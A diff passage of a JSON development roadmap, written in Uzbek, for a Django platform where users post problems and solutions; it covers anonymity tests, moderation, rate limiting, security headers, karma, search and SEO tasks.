       "id": "D1-T6",
@@ -375,13 +649,39 @@
       "nom": "⚠️ Anonimlik invarianti va uning testlari",
       "tavsif": "is_anonymous=True bo'lganda author HECH QAYERDA chiqmasligi: template, kontekst, API, ORM annotate, admin ro'yxati, hatto HTML izohlarda ham.",
       "nega": "Anonimlik — bu funksiya emas, VA'DA. Bir marta buzilsa (bitta template, bitta JSON javob) foydalanuvchi ishonchi qaytmaydi. Bu qoida faqat testda qotirilgani uchun ishonchli bo'ladi.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D1-T3"], "holat": "todo",
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T3"
+      ],
+      "holat": "done",
       "qabul_mezoni": [
         "public_author property: anonim bo'lsa None qaytaradi",
         "Har bir ko'rinish uchun test: javob matnida author.username YO'Q",
         "Admin panelda kim ko'ra olishi hujjatlashtirilgan va maxfiylik siyosatida yozilgan"
       ],
-      "ochiq_savol": "Bir foydalanuvchining bir nechta anonim posti o'zaro bog'lanmasligi kerakmi? Agar ha — har postga alohida anon_handle kerak."
+      "ochiq_savol": "Bir foydalanuvchining bir nechta anonim posti o'zaro bog'lanmasligi kerakmi? Agar ha — har postga alohida anon_handle kerak.",
+      "tugatilgan": "2026-08-27",
+      "natija": {
+        "yaratilgan": [
+          "Complaint.public_author va Solution.public_author — muallifga YAGONA ommaviy kirish nuqtasi",
+          "apps/complaints/tests/test_anonimlik.py — 8 test",
+          "apps/complaints/admin.py — anonimlik va admin bo'yicha hujjatlashtirilgan qaror"
+        ],
+        "tekshirilgan": [
+          "anonim postda public_author None, oddiy postda muallif",
+          "o'chirilgan hisobda ham None (author=None)",
+          "__str__ va __repr__ da ism YO'Q (Sentry'ga ketadigan joy — D7-T1)",
+          "⭐ _complaint_card.html HAQIQATAN render qilinib, chiqishda ism YO'Qligi tasdiqlandi",
+          "teskari tomon ham: oddiy postda ism BOR (hammasini yashirib qo'yish testni yashil qilardi)",
+          "GUARD: barcha shablonlarda xom `.author` ishlatilmagani (regex, {% comment %} ichi hisobga olinmaydi)"
+        ],
+        "qarorlar": [
+          "Admin: RO'YXATDA `public_author` ('Anonim'), KARTOCHKADA haqiqiy muallif faqat o'qish uchun. Moderatsiya navbatini varaqlash odamlarni tasodifan oshkor qilmasin, lekin D2-T11 (uch ogohlantirish) uchun kim yozgani kerak.",
+          "⚠️ Bu istisno D2-T10 maxfiylik siyosatida OCHIQ yozilishi SHART: 'anonim postlarni moderatorlar zarurat bo'lganda muallif bilan bog'lay oladi'. Aytilmagan istisno — buzilgan va'da.",
+          "⚠️ OCHIQ QAROR Q2 (qisman): hozircha barcha anonim postlar shunchaki 'Anonim'. `anon_handle` maydoni BO'SH holda qo'shib qo'yildi — keyin to'ldirish migratsiyasi arzon bo'lsin."
+        ]
+      }
     },
     {
       "id": "D1-T7",
@@ -389,8 +689,16 @@
       "nom": "Lenta ko'rinishlari: Qaynoq / Yangi / Eng yaxshi / Yechilgan",
       "tavsif": "Saralash + kategoriya va avlod filtri, hammasi URL parametrlarida.",
       "nega": "Holat URL'da bo'lmasa foydalanuvchi filtrlangan lentani ulasha olmaydi va orqaga qaytganda filtr yo'qoladi.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D1-T3"], "holat": "todo",
-      "qabul_mezoni": ["?sort=hot&category=moliya&generation=genz ishlaydi", "orqaga qaytganda holat saqlanadi"]
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T3"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "?sort=hot&category=moliya&generation=genz ishlaydi",
+        "orqaga qaytganda holat saqlanadi"
+      ]
     },
     {
       "id": "D1-T8",
@@ -398,9 +706,20 @@
       "nom": "HTMX ovoz berish endpoint'i",
       "tavsif": "POST /ovoz/<model>/<pk>/<yo'nalish>/ -> yangilangan ovoz blokini qaytaradi. Kirmagan foydalanuvchiga 401 + login taklifi.",
       "nega": "Maketdagi optimistik UI shu endpoint'ga ulanadi. Mehmon xulqi allaqachon hal qilingan (C varianti).",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D1-T5"], "holat": "todo",
-      "fayllar": ["frontend/static/js/app.js"],
-      "qabul_mezoni": ["CSRF himoyalangan", "javob faqat ovoz blokini qaytaradi", "kirmagan foydalanuvchida ovoz o'zgarmaydi"]
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T5"
+      ],
+      "holat": "todo",
+      "fayllar": [
+        "frontend/static/js/app.js"
+      ],
+      "qabul_mezoni": [
+        "CSRF himoyalangan",
+        "javob faqat ovoz blokini qaytaradi",
+        "kirmagan foydalanuvchida ovoz o'zgarmaydi"
+      ]
     },
     {
       "id": "D1-T9",
@@ -408,8 +727,16 @@
       "nom": "Muammo yaratish / tahrirlash formasi",
       "tavsif": "Server tomonda validatsiya, HTMX inline xatolar, qoralama avtosaqlash.",
       "nega": "Uzun forma tasodifan yopilsa matn yo'qoladi — bu foydalanuvchini qaytmaydigan qiladi.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D1-T3"], "holat": "todo",
-      "qabul_mezoni": ["min uzunlik server tomonda tekshiriladi", "tahrirlash oynasi cheklangan (masalan 30 daqiqa)"]
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T3"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "min uzunlik server tomonda tekshiriladi",
+        "tahrirlash oynasi cheklangan (masalan 30 daqiqa)"
+      ]
     },
     {
       "id": "D1-T10",
@@ -417,8 +744,16 @@
       "nom": "Yechim yozish va qabul qilish oqimi",
       "tavsif": "Yechim qo'shish; muammo egasi bittasini qabul qiladi; complaint.is_solved va accepted_solution yangilanadi.",
       "nega": "Qabul qilish — mahsulotning yakuniy qiymati. Reja bo'yicha shu nuqtada kontakt almashinuvi ham boshlanadi.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D1-T4"], "holat": "todo",
-      "qabul_mezoni": ["faqat muallif qabul qila oladi", "qabul qilish karma hodisasini yaratadi"]
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T4"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "faqat muallif qabul qila oladi",
+        "qabul qilish karma hodisasini yaratadi"
+      ]
     },
     {
       "id": "D1-T11",
@@ -426,8 +761,17 @@
       "nom": "Trending (hot_score) algoritmi + Celery beat",
       "tavsif": "score = log10(max(|ovoz|,1)) + sign(ovoz) * (yosh_sekundlarda / 45000). Har 10 daqiqada FAQAT oxirgi 7 kunlik postlar qayta hisoblanadi.",
       "nega": "Reja 'Celery trending hisoblaydi' deydi, lekin formula yo'q. Butun bazani qayta hisoblash 10 ming postdan keyin serverni yotqizadi — oyna kerak.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D1-T5"], "holat": "todo",
-      "qabul_mezoni": ["bulk_update bilan yangilanadi", "vazifa 5 sekunddan kam ishlaydi", "formula testda qoplangan"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T5"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "bulk_update bilan yangilanadi",
+        "vazifa 5 sekunddan kam ishlaydi",
+        "formula testda qoplangan"
+      ]
     },
     {
       "id": "D1-T12",
@@ -435,8 +779,15 @@
       "nom": "Sahifalash / HTMX 'yana yuklash'",
       "tavsif": "Kursor asosida (created_at + id), offset emas.",
       "nega": "OFFSET sahifalash chuqur sahifalarda sekinlashadi va yangi post qo'shilganda elementlar takrorlanadi.",
-      "ustuvorlik": "P1", "hajm": "S", "bogliq": ["D1-T7"], "holat": "todo",
-      "qabul_mezoni": ["20-sahifada ham so'rov vaqti barqaror"]
+      "ustuvorlik": "P1",
+      "hajm": "S",
+      "bogliq": [
+        "D1-T7"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "20-sahifada ham so'rov vaqti barqaror"
+      ]
     },
     {
       "id": "D1-T13",
@@ -444,8 +795,15 @@
       "nom": "Saqlanganlar (xatcho'p)",
       "tavsif": "SavedItem: user, target, created_at.",
       "nega": "Maketda profil sahifasida allaqachon bo'sh holati bor.",
-      "ustuvorlik": "P2", "hajm": "S", "bogliq": ["D1-T3"], "holat": "todo",
-      "qabul_mezoni": ["unique_together(user, target)"]
+      "ustuvorlik": "P2",
+      "hajm": "S",
+      "bogliq": [
+        "D1-T3"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "unique_together(user, target)"
+      ]
     },
     {
       "id": "D1-T14",
@@ -453,19 +811,34 @@
       "nom": "N+1 so'rovlar auditi va so'rov-sanog'i testlari",
       "tavsif": "select_related/prefetch_related; assertNumQueries bilan lenta va detal sahifasi qotiriladi.",
       "nega": "Lenta 20 ta karta ko'rsatadi — har kartada muallif, kategoriya, ovoz holati bor. Ehtiyotsizlikda bitta sahifa 80 ta so'rov qiladi.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D1-T7"], "holat": "todo",
-      "qabul_mezoni": ["lenta sahifasi ≤ 8 so'rov", "test so'rov sonini qotiradi"],
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T7"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "lenta sahifasi ≤ 8 so'rov",
+        "test so'rov sonini qotiradi"
+      ],
       "eslatma": "Sayt bo'ylab kontekst-protsessorni keshlash so'rov-sanog'i testlarini buzadi (birinchi render +1, ikkinchisi 0) — keshlamang yoki testni moslang."
     },
-
     {
       "id": "D2-T1",
       "faza": "M2",
       "nom": "Report (shikoyat) modeli va oqimi",
       "tavsif": "Report: reporter, target, reason (tanlov), comment, status, resolved_by, resolved_at.",
       "nega": "Maketda shikoyat modali bor, lekin ortida hech narsa yo'q. Shikoyatsiz platforma — moderatsiyasi ko'r platforma.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D0-T5"], "holat": "todo",
-      "qabul_mezoni": ["bir foydalanuvchi bitta obyektga bir marta shikoyat qiladi", "N ta shikoyat avtomatik navbatga ko'taradi"]
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T5"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "bir foydalanuvchi bitta obyektga bir marta shikoyat qiladi",
+        "N ta shikoyat avtomatik navbatga ko'taradi"
+      ]
     },
     {
       "id": "D2-T2",
@@ -473,8 +846,16 @@
       "nom": "Moderatsiya navbati (staff interfeysi)",
       "tavsif": "Shikoyatlar ro'yxati, kontekst bilan ko'rish, harakatlar: yashirish / o'chirish / ogohlantirish / rad etish.",
       "nega": "Django admin bu ish uchun juda sekin — moderator har bir holatda 5 ta sahifa ochishi kerak bo'ladi.",
-      "ustuvorlik": "P0", "hajm": "L", "bogliq": ["D2-T1"], "holat": "todo",
-      "qabul_mezoni": ["bitta ekranda qaror qabul qilinadi", "klaviatura bilan tez ishlash mumkin"]
+      "ustuvorlik": "P0",
+      "hajm": "L",
+      "bogliq": [
+        "D2-T1"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "bitta ekranda qaror qabul qilinadi",
+        "klaviatura bilan tez ishlash mumkin"
+      ]
     },
     {
       "id": "D2-T3",
@@ -482,8 +863,16 @@
       "nom": "Ko'rinish invarianti: moderation_status barcha so'rovlarda hisobga olinadi",
       "tavsif": "Yashirilgan kontent lentada, qidiruvda, profilda, sitemap'da, RSS'da va API'da CHIQMASLIGI kerak.",
       "nega": "Bitta unutilgan so'rov (masalan sitemap) yashirilgan kontentni Google'ga beradi. Bu qoida bitta joyda — manager darajasida — amalga oshirilishi kerak.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D2-T2"], "holat": "todo",
-      "qabul_mezoni": ["visible() manager metodi yagona kirish nuqtasi", "har bir ommaviy ko'rinish uchun test"]
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D2-T2"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "visible() manager metodi yagona kirish nuqtasi",
+        "har bir ommaviy ko'rinish uchun test"
+      ]
     },
     {
       "id": "D2-T4",
@@ -491,8 +880,16 @@
       "nom": "Tezlik cheklovi (rate limiting)",
       "tavsif": "Post yozish, yechim yozish, ovoz berish, shikoyat — IP va foydalanuvchi bo'yicha, Redis'da.",
       "nega": "Ovoz berish endpoint'i eng arzon va eng ko'p suiisteʼmol qilinadigan nuqta. Cheklovsiz bir skript reytingni butunlay buzadi.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D1-T8"], "holat": "todo",
-      "qabul_mezoni": ["chegara oshsa 429 va tushunarli xabar", "cheklovlar sozlamada, kodda emas"]
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T8"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "chegara oshsa 429 va tushunarli xabar",
+        "cheklovlar sozlamada, kodda emas"
+      ]
     },
     {
       "id": "D2-T5",
@@ -500,8 +897,15 @@
       "nom": "Spam himoyasi: honeypot + evristika",
       "tavsif": "Yashirin maydon, forma to'ldirish vaqti, havola soni, yangi hisob cheklovi.",
       "nega": "CAPTCHA foydalanuvchini qochiradi. Evristika ko'rinmas va aksariyat spamni to'xtatadi; CAPTCHA faqat shubhali holatda ko'rsatiladi.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D1-T9"], "holat": "todo",
-      "qabul_mezoni": ["3 sekunddan tez to'ldirilgan forma shubhali deb belgilanadi"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T9"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "3 sekunddan tez to'ldirilgan forma shubhali deb belgilanadi"
+      ]
     },
     {
       "id": "D2-T6",
@@ -509,7 +913,12 @@
       "nom": "⚠️ Inqirozli kontent siyosati (o'z joniga qasd / o'z-o'ziga zarar)",
       "tavsif": "Kalit so'z aniqlash -> (1) postni JIM O'CHIRMASDAN moderatsiya navbatining eng tepasiga chiqarish, (2) muallifga va o'quvchiga rasmiy ishonch telefoni ma'lumotini ko'rsatish, (3) alohida javob qo'llanmasi.",
       "nega": "Odamlarni ruhiy og'riqlari bilan bo'lishishga chaqiradigan platforma muqarrar ravishda shunday kontentni oladi. Bu ehtimol emas, vaqt masalasi. Tayyor siyosat bo'lmasa qaror tungi soat 2 da shoshib qabul qilinadi. Jim o'chirish eng yomon variant — u odamni yakkalaydi.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": ["D2-T2"], "holat": "todo",
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [
+        "D2-T2"
+      ],
+      "holat": "todo",
       "qabul_mezoni": [
         "O'zbekistondagi RASMIY ishonch telefoni raqami TASDIQLANGAN va joylashtirilgan",
         "aniqlangan post 15 daqiqa ichida moderatorga ko'rinadi",
@@ -523,8 +932,15 @@
       "nom": "O'zgarmas audit jurnali",
       "tavsif": "Har bir moderator harakati: kim, nima, qachon, sabab. Faqat qo'shiladi, tahrirlanmaydi va o'chirilmaydi.",
       "nega": "Kontent o'chirilgani ustidan nizo chiqsa (yoki huquqiy so'rov kelsa) jurnal yagona dalil bo'ladi.",
-      "ustuvorlik": "P1", "hajm": "S", "bogliq": ["D2-T2"], "holat": "todo",
-      "qabul_mezoni": ["admin'da o'chirish/tahrirlash o'chirilgan"]
+      "ustuvorlik": "P1",
+      "hajm": "S",
+      "bogliq": [
+        "D2-T2"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "admin'da o'chirish/tahrirlash o'chirilgan"
+      ]
     },
     {
       "id": "D2-T8",
@@ -532,8 +948,15 @@
       "nom": "Hisobni o'chirish va ma'lumot eksporti",
       "tavsif": "O'chirishda: shaxsiy ma'lumot tozalanadi, kontent sentinel muallifga o'tadi (jamoa yechimlari yo'qolmasin). Eksport: JSON, fon vazifasida.",
       "nega": "Foydalanuvchi o'chganda uning 200 ta yechimi ham o'chsa — bu boshqa odamlarning qiymatini yo'q qiladi. Anonimlashtirish to'g'ri yechim.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D0-T5"], "holat": "todo",
-      "qabul_mezoni": ["o'chirilgan foydalanuvchining kontenti qoladi, ismi 'O'chirilgan foydalanuvchi'ga aylanadi"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T5"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "o'chirilgan foydalanuvchining kontenti qoladi, ismi 'O'chirilgan foydalanuvchi'ga aylanadi"
+      ]
     },
     {
       "id": "D2-T9",
@@ -541,8 +964,16 @@
       "nom": "Xavfsizlik sarlavhalari va CSP",
       "tavsif": "CSP (nonce bilan), HSTS, X-Frame-Options, secure/httponly cookie'lar, SECURE_SSL_REDIRECT.",
       "nega": "Maketda inline skriptlar bor (mavzu almashtirgich) — ular nonce olmasa CSP ularni bloklaydi.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D0-T6"], "holat": "todo",
-      "qabul_mezoni": ["manage.py check --deploy toza", "CSP buzilishi konsolda yo'q"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T6"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "manage.py check --deploy toza",
+        "CSP buzilishi konsolda yo'q"
+      ]
     },
     {
       "id": "D2-T10",
@@ -550,8 +981,14 @@
       "nom": "Foydalanish shartlari, maxfiylik siyosati, yosh chegarasi",
       "tavsif": "Sahifalar + ro'yxatdan o'tishda rozilik + 16+ yosh tasdig'i.",
       "nega": "Reja auditoriyani 16 yoshdan deb belgilagan. Shaxsiy va ruhiy mavzular bilan ishlaydigan platforma uchun bu huquqiy minimum.",
-      "ustuvorlik": "P0", "hajm": "M", "bogliq": [], "holat": "todo",
-      "qabul_mezoni": ["matnlar yurist tomonidan ko'rilgan", "rozilik sanasi saqlanadi"]
+      "ustuvorlik": "P0",
+      "hajm": "M",
+      "bogliq": [],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "matnlar yurist tomonidan ko'rilgan",
+        "rozilik sanasi saqlanadi"
+      ]
     },
     {
       "id": "D2-T11",
@@ -559,17 +996,28 @@
       "nom": "Foydalanuvchini bloklash va uch-ogohlantirish tizimi",
       "tavsif": "Ogohlantirish -> vaqtinchalik cheklov -> doimiy bloklash. Foydalanuvchilar o'zaro bloklashi ham mumkin.",
       "nega": "Moderator uchun yagona qurol 'o'chirish' bo'lsa, u yo hech narsa qilmaydi yo ortiqcha jazolaydi. Bosqichlilik kerak.",
-      "ustuvorlik": "P2", "hajm": "M", "bogliq": ["D2-T7"], "holat": "todo",
-      "qabul_mezoni": ["bloklangan foydalanuvchi yoza olmaydi, lekin o'qiy oladi"]
+      "ustuvorlik": "P2",
+      "hajm": "M",
+      "bogliq": [
+        "D2-T7"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "bloklangan foydalanuvchi yoza olmaydi, lekin o'qiy oladi"
+      ]
     },
-
     {
       "id": "D3-T1",
       "faza": "M3",
       "nom": "⚠️ Karma: butun son emas, hodisalar jurnali (ledger)",
       "tavsif": "KarmaEvent: user, event_type, points, source (obyekt), created_at. User.karma_cached — denormalizatsiya.",
       "nega": "Rejadagi karma_points butun son bilan: (1) post o'chsa karma qaytmaydi, (2) 'nima uchun 1340 ball?' savoliga javob yo'q, (3) qoidalar o'zgarsa qayta hisoblab bo'lmaydi, (4) suiisteʼmolni orqaga qaytarib bo'lmaydi. Ledger buni hal qiladi va oylik reytingni ham arzon qiladi.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D1-T10"], "holat": "todo",
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T10"
+      ],
+      "holat": "todo",
       "qabul_mezoni": [
         "karma_cached = SUM(KarmaEvent.points) — test buni tasdiqlaydi",
         "kontent o'chirilsa teskari hodisa yoziladi",
@@ -582,8 +1030,15 @@
       "nom": "Nishonlar (badge) tizimi",
       "tavsif": "Badge + UserBadge; shartlar signal yoki Celery orqali tekshiriladi. Qulflangan nishon SABABI bilan ko'rsatiladi.",
       "nega": "Maketda 'Ishonchli maslahatchi' qulflangan holati bor va u ochilish shartini aytadi — bu shunchaki bezak emas, xulqni yo'naltiradi.",
-      "ustuvorlik": "P2", "hajm": "M", "bogliq": ["D3-T1"], "holat": "todo",
-      "qabul_mezoni": ["nishon shartlari ma'lumotlarda, kodda emas"]
+      "ustuvorlik": "P2",
+      "hajm": "M",
+      "bogliq": [
+        "D3-T1"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "nishon shartlari ma'lumotlarda, kodda emas"
+      ]
     },
     {
       "id": "D3-T3",
@@ -591,8 +1046,15 @@
       "nom": "Oylik reyting (keshlangan)",
       "tavsif": "Oy bo'yicha KarmaEvent yig'indisi; Celery har soatda hisoblaydi, Redis'da saqlanadi.",
       "nega": "Reyting har sahifa yuklanishida hisoblanmasin — u lentaning yon panelida, ya'ni har sahifada ko'rinadi.",
-      "ustuvorlik": "P2", "hajm": "S", "bogliq": ["D3-T1"], "holat": "todo",
-      "qabul_mezoni": ["reyting so'rovi keshdan keladi"]
+      "ustuvorlik": "P2",
+      "hajm": "S",
+      "bogliq": [
+        "D3-T1"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "reyting so'rovi keshdan keladi"
+      ]
     },
     {
       "id": "D3-T4",
@@ -600,8 +1062,16 @@
       "nom": "Profil sahifasi va tablar",
       "tavsif": "Dardlar / Yechimlar / Saqlanganlar; anonim postlar FAQAT egasiga ko'rinadi.",
       "nega": "Anonim postni ommaviy profilda ko'rsatish — anonimlikni buzishning eng oson yo'li.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D1-T6", "D3-T1"], "holat": "todo",
-      "qabul_mezoni": ["boshqa odam profilida anonim postlar YO'Q — test bilan qoplangan"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T6",
+        "D3-T1"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "boshqa odam profilida anonim postlar YO'Q — test bilan qoplangan"
+      ]
     },
     {
       "id": "D3-T5",
@@ -609,18 +1079,33 @@
       "nom": "ExpertProfile modeli va tasdiqlash oqimi",
       "tavsif": "specialty, experience_years, bio, verification_status, verified_by, verified_at, contact_visible, pro_until.",
       "nega": "Rejadagi is_expert boolean yetarli emas — soha, tajriba, tasdiqlash holati va PRO muddati kerak. 'Tasdiqlangan' nishoni tasdiqlash jarayonisiz yolg'on.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D0-T2"], "holat": "todo",
-      "qabul_mezoni": ["tasdiqlanmagan ekspert PRO nishonini ololmaydi", "hujjat yuklash va staff ko'rigi bor"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D0-T2"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "tasdiqlanmagan ekspert PRO nishonini ololmaydi",
+        "hujjat yuklash va staff ko'rigi bor"
+      ]
     },
-
     {
       "id": "D4-T1",
       "faza": "M4",
       "nom": "PostgreSQL to'liq matnli qidiruv (FTS)",
       "tavsif": "SearchVector maydoni + GIN indeks; 'simple' konfiguratsiya + unaccent; pg_trgm xato yozuvlar uchun.",
       "nega": "Postgres'da o'zbek tili lug'ati YO'Q — 'english' konfiguratsiyasi o'zbekcha so'zlarni noto'g'ri kesadi. 'simple' + trigram amaliy yechim.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D1-T3"], "holat": "todo",
-      "qabul_mezoni": ["10 ming postda qidiruv <200ms", "search_vector trigger yoki signal bilan yangilanadi"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T3"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "10 ming postda qidiruv <200ms",
+        "search_vector trigger yoki signal bilan yangilanadi"
+      ]
     },
     {
       "id": "D4-T2",
@@ -628,8 +1113,16 @@
       "nom": "⚠️ Lotin/kiril va apostrof normalizatsiyasi",
       "tavsif": "Indekslash va qidiruvda: kiril->lotin transliteratsiya, o'/oʻ/o` variantlari bir xil ko'rinishga keltiriladi.",
       "nega": "O'zbek foydalanuvchilari ikkala alifboda ham yozadi, apostrofni esa 3 xil belgi bilan qo'yadi ('  ʻ  `). Normalizatsiyasiz 'ko'chmas mulk' va 'кўчмас мулк' bir-birini topmaydi — qidiruv ishlamayotgandek tuyuladi.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D4-T1"], "holat": "todo",
-      "qabul_mezoni": ["'ipoteka' va 'ипотека' bir xil natija beradi", "apostrof variantlari test bilan qoplangan"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D4-T1"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "'ipoteka' va 'ипотека' bir xil natija beradi",
+        "apostrof variantlari test bilan qoplangan"
+      ]
     },
     {
       "id": "D4-T3",
@@ -637,8 +1130,15 @@
       "nom": "Qidiruv sahifasi va filtrlar",
       "tavsif": "Natijalar, ajratib ko'rsatish (highlight), kategoriya/avlod/holat filtri, bo'sh holat.",
       "nega": "Maketda qidiruv maydoni bor, lekin natijalar sahifasi yo'q — bu yetishmayotgan ekran.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D4-T2"], "holat": "todo",
-      "qabul_mezoni": ["natija topilmasa taklif beriladi (yaqin so'zlar)"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D4-T2"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "natija topilmasa taklif beriladi (yaqin so'zlar)"
+      ]
     },
     {
       "id": "D4-T4",
@@ -646,8 +1146,16 @@
       "nom": "SEO asoslari: slug URL, canonical, meta, Open Graph",
       "tavsif": "Har sahifada unique title/description; OG rasm avtomatik yaratiladi (sarlavha + kategoriya).",
       "nega": "Reja SEO'ni asosiy texnik sabab deb ko'rsatgan. OG rasm ijtimoiy tarmoqda ulashishda bosilish darajasini sezilarli oshiradi — bu esa rejadagi virallik strategiyasining bir qismi.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D1-T3"], "holat": "todo",
-      "qabul_mezoni": ["har muammo sahifasi o'z canonical URL'iga ega", "OG rasm fon vazifasida yaratiladi"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T3"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "har muammo sahifasi o'z canonical URL'iga ega",
+        "OG rasm fon vazifasida yaratiladi"
+      ]
     },
     {
       "id": "D4-T5",
@@ -655,8 +1163,16 @@
       "nom": "sitemap.xml va robots.txt",
       "tavsif": "Django sitemap framework; FAQAT ko'rinadigan kontent; yashirilganlar chiqmaydi.",
       "nega": "Moderatsiya qilingan kontent sitemap'ga tushsa Google uni indekslaydi — yashirish maʼnosini yo'qotadi.",
-      "ustuvorlik": "P1", "hajm": "S", "bogliq": ["D2-T3", "D4-T4"], "holat": "todo",
-      "qabul_mezoni": ["sitemap visible() manageridan foydalanadi — test bilan qoplangan"]
+      "ustuvorlik": "P1",
+      "hajm": "S",
+      "bogliq": [
+        "D2-T3",
+        "D4-T4"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "sitemap visible() manageridan foydalanadi — test bilan qoplangan"
+      ]
     },
     {
       "id": "D4-T6",
@@ -664,8 +1180,15 @@
       "nom": "Schema.org QAPage strukturaviy ma'lumoti",
       "tavsif": "JSON-LD: Question + acceptedAnswer + suggestedAnswer, upvoteCount bilan.",
       "nega": "Savol-javob sayti uchun bu eng yuqori daromadli SEO ishi — Google natijalarda javobni to'g'ridan-to'g'ri ko'rsatadi va bosilish sezilarli oshadi.",
-      "ustuvorlik": "P1", "hajm": "S", "bogliq": ["D4-T4"], "holat": "todo",
-      "qabul_mezoni": ["Google Rich Results Test xatosiz o'tadi"]
+      "ustuvorlik": "P1",
+      "hajm": "S",
+      "bogliq": [
+        "D4-T4"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "Google Rich Results Test xatosiz o'tadi"
+      ]
     },
     {
       "id": "D4-T7",
@@ -673,18 +1196,32 @@
       "nom": "O'xshash muammolar (trigram o'xshashligi)",
       "tavsif": "Detal sahifasida 3 ta o'xshash muammo; natija keshlanadi.",
       "nega": "Maketda yon panelda joyi bor. Bu ichki havolalar SEO uchun ham, foydalanuvchini ushlab qolish uchun ham ishlaydi.",
-      "ustuvorlik": "P2", "hajm": "S", "bogliq": ["D4-T1"], "holat": "todo",
-      "qabul_mezoni": ["hisoblash fon vazifasida, so'rov paytida emas"]
+      "ustuvorlik": "P2",
+      "hajm": "S",
+      "bogliq": [
+        "D4-T1"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "hisoblash fon vazifasida, so'rov paytida emas"
+      ]
     },
-
     {
       "id": "D5-T1",
       "faza": "M5",
       "nom": "Notification modeli va ichki bildirishnomalar markazi",
       "tavsif": "recipient, actor, verb, target, is_read, created_at. Sarlavhada o'qilmaganlar soni.",
       "nega": "Telegram'ga tayanish xavfli — foydalanuvchi botni bloklashi mumkin. Ichki markaz zaxira kanal.",
-      "ustuvorlik": "P1", "hajm": "M", "bogliq": ["D1-T10"], "holat": "todo",
-      "qabul_mezoni": ["o'qilmaganlar soni keshlanadi", "ko'rilgandan keyin tozalanadi"]
+      "ustuvorlik": "P1",
+      "hajm": "M",
+      "bogliq": [
+        "D1-T10"
+      ],
+      "holat": "todo",
+      "qabul_mezoni": [
+        "o'qilmaganlar soni keshlanadi",
